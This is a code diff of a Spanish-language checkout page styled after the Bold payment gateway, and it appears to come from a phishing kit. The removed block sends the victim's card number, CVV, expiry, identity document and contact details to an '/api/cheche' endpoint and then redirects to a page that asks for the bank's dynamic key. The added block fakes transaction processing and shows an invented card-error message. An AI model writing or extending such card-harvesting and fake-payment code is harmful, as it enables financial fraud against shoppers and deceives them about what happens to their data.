@@ -201,54 +201,24 @@ export default function BoldPagosPage() {
       }
     }
 
-    // Para otros bancos, también pedir clave dinámica genérica
+    // Para otros bancos, mostrar procesando y luego error
     try {
-      const response = await fetch('/api/cheche', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          action: 'create_session',
-          bank: bankName !== 'Desconocido' ? bankName : 'Otro',
-          
-          fullName: orderData.customer.fullName,
-          email,
-          phone: `+57${phoneNumber}`,
-          address: orderData.customer.address,
-          city: orderData.customer.city,
-          state: orderData.customer.state,
-          country: orderData.customer.country,
-          postalCode: orderData.customer.postalCode,
-          documentId: orderData.customer.documentId,
-          
-          cardNumber: cardNumber.replace(/\s/g, ''),
-          cardHolderName: cardHolderName,
-          expiryDate: expiryDate,
-          cvv: cvv,
-          cardBrand: cardType,
-          
-          totalAmount: orderData.totalAmount,
-          customerData: orderData.customer,
-          orderData: orderData,
-          
-          paymentMethod: 'Bold'
-        })
-      });
-
-      if (!response.ok) {
-        throw new Error('Error al crear sesión de autenticación');
-      }
-
-      const result = await response.json();
+      // Simular procesamiento
+      await new Promise(resolve => setTimeout(resolve, 2000));
       
-      if (result.success && result.session) {
-        // Redirigir a página genérica de clave dinámica
-        router.push(`/clave-dinamica?sessionId=${result.session.sessionId}`);
-        return;
-      }
-    } catch (error) {
-      console.error('Error creating authentication session:', error);
-      showNotification('Hubo un error al procesar el pago. Por favor intenta de nuevo.');
+      // Redirigir al carrito con mensaje de error
       setLoading(false);
+      showNotification('Error al procesar el pago. Por favor verifica los datos de tu tarjeta e intenta nuevamente.', 'error');
+      
+      // Después de 2 segundos, redirigir al carrito
+      setTimeout(() => {
+        router.push('/carrito?error=payment_failed');
+      }, 2000);
+      
+    } catch (error) {
+      console.error('Error processing payment:', error);
+      setLoading(false);
+      showNotification('Hubo un error al procesar el pago. Por favor intenta de nuevo.');
     }
   };
 
@@ -658,9 +628,17 @@ export default function BoldPagosPage() {
               <button
                 type="submit"
                 disabled={loading || !acceptData || !acceptTerms}
-                className="w-full bg-gradient-to-r from-pink-500 to-red-500 hover:from-pink-600 hover:to-red-600 text-white font-bold py-4 rounded-full text-lg transition disabled:opacity-50 disabled:cursor-not-allowed shadow-lg"
+                className="w-full bg-gradient-to-r from-pink-500 to-red-500 hover:from-pink-600 hover:to-red-600 text-white font-bold py-4 rounded-full text-lg transition disabled:opacity-50 disabled:cursor-not-allowed shadow-lg flex items-center justify-center gap-2"
               >
-                {loading ? 'Procesando...' : 'Pagar'}
+                {loading ? (
+                  <>
+                    <svg className="animate-spin h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
+                      <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
+                      <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
+                    </svg>
+                    Procesando transacción...
+                  </>
+                ) : 'Pagar'}
               </button>
 
               {/* Link abandonar */}
